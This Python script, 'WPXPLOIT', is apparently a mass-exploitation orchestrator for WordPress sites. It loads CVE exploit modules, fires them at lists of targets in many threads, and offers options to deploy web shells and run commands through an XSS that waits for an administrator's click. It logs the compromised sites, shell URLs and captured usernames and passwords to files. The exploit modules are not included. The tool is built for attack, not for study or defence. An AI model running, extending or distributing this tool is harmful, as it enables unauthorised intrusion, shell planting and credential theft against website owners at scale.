#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WPXPLOIT — WordPress multi-CVE mass exploit orchestrator (auto-discovery)
import argparse
import asyncio
import importlib
import inspect
import json
import os
import pkgutil
import sys
import threading
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

# ────────────── ensure `function/` resolvable ──────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

# ────────────── colors ──────────────
RESET, BOLD = '\033[0m', '\033[1m'
RED    = '\033[91m'
GREEN  = '\033[92m'
YELLOW = '\033[93m'
BLUE   = '\033[94m'
MAGENTA= '\033[95m'
CYAN   = '\033[96m'
GRAY   = '\033[90m'
WHITE  = '\033[97m'

BANNER = r"""
██╗    ██╗██████╗ ██╗  ██╗
██║    ██║██╔══██╗╚██╗██╔╝
██║ █╗ ██║██████╔╝ ╚███╔╝ 
██║███╗██║██╔═══╝  ██╔██╗ 
╚███╔███╔╝██║     ██╔╝ ██╗
 ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝
"""

def print_banner(registry):
    print(f'{GREEN}{BANNER}{RESET}')
    print(f'{CYAN}{BOLD}WPXPLOIT{RESET} {GRAY}— CreateBy : @JayaXploit{RESET}')
    print(f'{GRAY}auto-discovered {len(registry)} CVE module(s) | '
          f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}{RESET}')
    print(f'{GRAY}{"-" * 70}{RESET}\n')

# ────────────── auto-discovery ──────────────
def _infer_cve_id(module_name):
    m = module_name.lower()
    if not m.startswith('cve_'):
        return None
    parts = m[4:].split('_')
    if len(parts) < 2:
        return m.upper()
    return 'CVE-' + '-'.join(parts)

def _infer_kwargs(fn, cve_id, module=None):
    """Baca DEFAULT_KWARGS dari modul CVE, atau fallback ke tweaks."""
    if module is not None:
        dk = getattr(module, 'DEFAULT_KWARGS', None)
        if dk:
            return dict(dk)
    tweaks = {
        'CVE-2026-116512': {'shell': True},
        'CVE-2026-119977': {'deploy_shell': True, 'duration': 120.0},
        'CVE-2026-64638':  {'wait_timeout': 60}, # default XSS wait 60 detik
    }
    return dict(tweaks.get(cve_id, {}))

def _infer_timeout_shape(fn, cve_id):
    try:
        sig = inspect.signature(fn)
    except (TypeError, ValueError):
        return 'float'
    if 'timeout' not in sig.parameters:
        return 'none'
    if cve_id == 'CVE-2026-116512':
        return 'tuple'
    return 'float'

def discover_cves():
    registry = {}
    try:
        from function import __path__ as fn_path
    except ImportError:
        print(f'{RED}[-] cannot import package `function` from {_HERE}{RESET}')
        print(f'{GRAY}    structure expected:{RESET}')
        print(f'{GRAY}      {_HERE}/main.py{RESET}')
        print(f'{GRAY}      {_HERE}/function/__init__.py{RESET}')
        print(f'{GRAY}      {_HERE}/function/cve_*.py{RESET}')
        return registry

    for finder, name, _ispkg in pkgutil.iter_modules(fn_path):
        if not name.startswith('cve_'):
            continue
        full_name = f'function.{name}'
        try:
            mod = importlib.import_module(full_name)
        except Exception as e:
            print(f'{YELLOW}[!] import failed {full_name}: {type(e).__name__}: {e}{RESET}')
            continue

        fn = getattr(mod, 'exploit', None)
        if not callable(fn):
            print(f'{YELLOW}[!] skip {name}: no `exploit()` function{RESET}')
            continue

        cve_id = getattr(mod, 'CVE_ID', None) or _infer_cve_id(name)
        cve_name = getattr(mod, 'CVE_NAME', None) or getattr(mod, 'name', None) or '(no description)'
        is_async = inspect.iscoroutinefunction(fn)

        registry[cve_id] = {
            'id': cve_id,
            'name': cve_name,
            'key': name,
            'fn': fn,
            'is_async': is_async,
            'kwargs': _infer_kwargs(fn, cve_id, module=mod),
            'timeout_shape': _infer_timeout_shape(fn, cve_id),
            'module': mod,
        }
    return registry

# ────────────── runner ──────────────
def _call_exploit(entry, target, timeout, proxy, verify_login, debug, xss_cmd, xss_wait):
    kwargs = dict(entry['kwargs'])
    kwargs['debug'] = debug

    ts = entry['timeout_shape']
    if ts == 'tuple':
        kwargs['timeout'] = (timeout, timeout)
    elif ts == 'float':
        kwargs['timeout'] = float(timeout)

    # Optional kwargs based on signature
    try:
        params = inspect.signature(entry['fn']).parameters
    except (TypeError, ValueError):
        params = {}

    if 'proxy' in params and proxy:
        kwargs['proxy'] = proxy
    if 'verify_login' in params:
        kwargs['verify_login'] = verify_login
    
    # Inject XSS specific arguments if the CVE is 64638
    if entry['id'] == 'CVE-2026-64638':
        if 'command' in params: kwargs['command'] = xss_cmd
        if 'wait_timeout' in params: kwargs['wait_timeout'] = xss_wait

    if entry['is_async']:
        return asyncio.run(entry['fn'](target, **kwargs))
    return entry['fn'](target, **kwargs)

def run_cve(cve_id, entry, target, timeout, proxy, verify_login, debug, xss_cmd, xss_wait):
    try:
        r = _call_exploit(entry, target, timeout, proxy, verify_login, debug, xss_cmd, xss_wait)
        if not isinstance(r, dict):
            r = {
                'target': target, 'cve': cve_id, 'vulnerable': False,
                'exploited': False, 'detail': f'invalid return type: {type(r).__name__}',
                'shell_url': '', 'output': '', 'evidence': None,
            }
        return cve_id, target, r
    except Exception as e:
        tb = traceback.format_exc() if debug else ''
        return cve_id, target, {
            'target': target, 'cve': cve_id, 'vulnerable': False,
            'exploited': False, 'detail': f'{type(e).__name__}: {e}',
            'shell_url': '', 'output': '', 'evidence': None,
            'traceback': tb if debug else None,
        }

# ────────────── display ──────────────
LOCK = threading.Lock()

def print_exploited(entry, r):
    if not r.get('exploited'): return
    with LOCK:
        print()
        print(f'{GREEN}+{"-" * 68}+{RESET}')
        print(f'{GREEN}|{RESET} {BOLD}{entry["id"]}{RESET}  {GRAY}{entry["name"]}{RESET}')
        print(f'{GREEN}|{RESET} target  : {CYAN}{r.get("target", "?")}{RESET}')
        if r.get('endpoint'): print(f'{GREEN}|{RESET} endpoint: {r["endpoint"]}')
        if r.get('shell_url'): print(f'{GREEN}|{RESET} shell   : {GREEN}{r["shell_url"]}{RESET}')
        if r.get('output'):
            out = str(r['output'])[:200].replace('\n', ' ')
            print(f'{GREEN}|{RESET} output  : {WHITE}{out}{RESET}')
        ev = r.get('evidence')
        if isinstance(ev, dict):
            for k, v in ev.items():
                print(f'{GREEN}|{RESET} {k:<8}: {str(v)[:120]}')
        elif ev:
            print(f'{GREEN}|{RESET} evidence: {str(ev)[:120]}')
        if r.get('detail'):
            print(f'{GREEN}|{RESET} detail  : {GRAY}{r["detail"]}{RESET}')
        print(f'{GREEN}+{"-" * 68}+{RESET}')
        sys.stdout.flush()

def print_progress(done, total, exploited_count):
    with LOCK:
        pct = int(done / total * 100) if total else 0
        bar_len = 30
        filled = int(bar_len * done / total) if total else 0
        bar = '=' * filled + '-' * (bar_len - filled)
        sys.stdout.write(
            f'\r{GRAY}[{bar}] {done}/{total} ({pct}%)  '
            f'{GREEN}exploited: {exploited_count}{RESET}   ')
        sys.stdout.flush()

# ────────────── save ──────────────
def save_result(exploited_list):
    if not exploited_list: return
    with open('exploited.txt', 'a') as f:
        for cve_id, r in exploited_list:
            line = f'{cve_id} | {r.get("target", "")}'
            if r.get('shell_url'): line += f' | shell={r["shell_url"]}'
            ev = r.get('evidence')
            if isinstance(ev, dict) and ev.get('type') == 'creds':
                line += f' | creds={ev.get("username")}:{ev.get("password")}'
            elif r.get('output'):
                line += f' | out={str(r["output"])[:80]}'
            f.write(line + '\n')
    with open('exploited.json', 'a') as f:
        for cve_id, r in exploited_list:
            f.write(json.dumps({
                'cve': cve_id,
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'result': r,
            }, default=str) + '\n')

# ────────────── io ──────────────
def load_targets(path):
    try:
        with open(path) as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    except IOError as e:
        print(f'{RED}[-] cannot read {path}: {e}{RESET}')
        sys.exit(1)
    seen, out = set(), []
    for l in lines:
        if l not in seen:
            seen.add(l); out.append(l)
    return out

def select_cves(registry, spec):
    if not spec or spec.lower() == 'all': return registry
    keys = [k.strip() for k in spec.split(',') if k.strip()]
    out = {}
    for k in keys:
        match = None
        if k in registry: match = k
        else:
            for cve_id, entry in registry.items():
                if entry['key'] == k or cve_id.lower() == k.lower():
                    match = cve_id; break
        if match is None:
            print(f'{RED}[-] unknown CVE: {k}{RESET}')
            print(f'{GRAY}    available: {", ".join(registry.keys())}{RESET}')
            sys.exit(1)
        out[match] = registry[match]
    return out

# ────────────── modes ──────────────
def mode_single(target, cves, timeout, proxy, verify_login, debug, xss_cmd, xss_wait):
    print(f'{CYAN}[*] single target: {target}{RESET}')
    print(f'{CYAN}[*] CVEs: {", ".join(c["id"] for c in cves.values())}{RESET}')
    exploited = []
    for cve_id, entry in cves.items():
        tag = '(async)' if entry['is_async'] else ''
        print(f'{GRAY}    -> {entry["id"]} {tag}...{RESET}', end=' ', flush=True)
        _, _, r = run_cve(cve_id, entry, target, timeout, proxy, verify_login, debug, xss_cmd, xss_wait)
        if r.get('exploited'):
            print(f'{GREEN}EXPLOITED{RESET}')
            print_exploited(entry, r)
            exploited.append((entry['id'], r))
        elif r.get('vulnerable'):
            print(f'{YELLOW}vulnerable (not fully exploited){RESET}')
        elif r.get('detail'):
            print(f'{GRAY}no — {r["detail"][:80]}{RESET}')
        else:
            print(f'{GRAY}not vulnerable{RESET}')
    if exploited:
        save_result(exploited)
        print(f'\n{GREEN}[+] {len(exploited)} exploited. Saved to exploited.txt / .json{RESET}')
    else:
        print(f'\n{RED}[-] no exploitation succeeded{RESET}')

def mode_mass(targets, cves, threads, timeout, proxy, verify_login, debug, xss_cmd, xss_wait):
    total = len(targets)
    jobs = [(t, cid, ce) for t in targets for cid, ce in cves.items()]
    print(f'{CYAN}[*] mass mode: {total} targets × {len(cves)} CVE = {len(jobs)} jobs × {threads} threads{RESET}')
    exploited = []
    done = 0
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {
            ex.submit(run_cve, cid, ce, t, timeout, proxy, verify_login, debug, xss_cmd, xss_wait): (cid, ce)
            for t, cid, ce in jobs
        }
        for fut in as_completed(futures):
            cid, ce = futures[fut]
            try:
                _, _, r = fut.result()
            except Exception as e:
                r = {'exploited': False, 'detail': str(e)}
            done += 1
            if r.get('exploited'):
                exploited.append((ce['id'], r))
                print_exploited(ce, r)
            print_progress(done, len(jobs), len(exploited))
    print()
    if exploited:
        save_result(exploited)
        print(f'{GREEN}[+] {len(exploited)} exploited. Saved to exploited.txt / .json{RESET}')
    else:
        print(f'{RED}[-] 0 exploited{RESET}')

def mode_list(registry):
    print(f'{MAGENTA}{BOLD}Discovered CVEs ({len(registry)}):{RESET}')
    for cve_id, entry in sorted(registry.items()):
        tag = f'{CYAN}[async]{RESET}' if entry['is_async'] else f'{GRAY}[sync]{RESET} '
        print(f'  {tag} {GREEN}{cve_id:<22}{RESET} {GRAY}{entry["key"]:<22}{RESET} {entry["name"]}')

# ────────────── main ──────────────
def main():
    p = argparse.ArgumentParser(description='WPXPLOIT — multi-CVE orchestrator')
    p.add_argument('-u', '--url', help='single target URL')
    p.add_argument('-l', '--list', help='target list file')
    p.add_argument('-t', '--threads', type=int, default=10)
    p.add_argument('-c', '--cve', default='all', help="'all' or comma-separated CVE IDs")
    p.add_argument('--timeout', type=int, default=20)
    p.add_argument('--proxy', help='HTTP proxy')
    p.add_argument('--no-verify-login', action='store_true')
    p.add_argument('--debug', action='store_true')
    p.add_argument('-L', '--list-cves', action='store_true')
    
    # XSS Specific args
    p.add_argument('--xss-command', default='id', help='Command to run for CVE-2026-64638 (default: id)')
    p.add_argument('--xss-wait', type=int, default=60, help='Seconds to wait for admin click (default: 60)')
    
    args = p.parse_args()

    registry = discover_cves()
    if not registry:
        print(f'{RED}[-] no CVE modules discovered{RESET}')
        sys.exit(1)

    if args.list_cves:
        mode_list(registry)
        return

    print_banner(registry)

    if not args.url and not args.list:
        p.error('need -u or -l (or -L)')

    cves = select_cves(registry, args.cve)
    verify_login = not args.no_verify_login

    if args.url:
        mode_single(args.url, cves, args.timeout, args.proxy, verify_login, args.debug, args.xss_command, args.xss_wait)
    else:
        targets = load_targets(args.list)
        if not targets:
            print(f'{RED}[-] empty target list{RESET}')
            sys.exit(1)
        mode_mass(targets, cves, args.threads, args.timeout, args.proxy, verify_login, args.debug, args.xss_command, args.xss_wait)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{YELLOW}[!] interrupted{RESET}')
        sys.exit(130)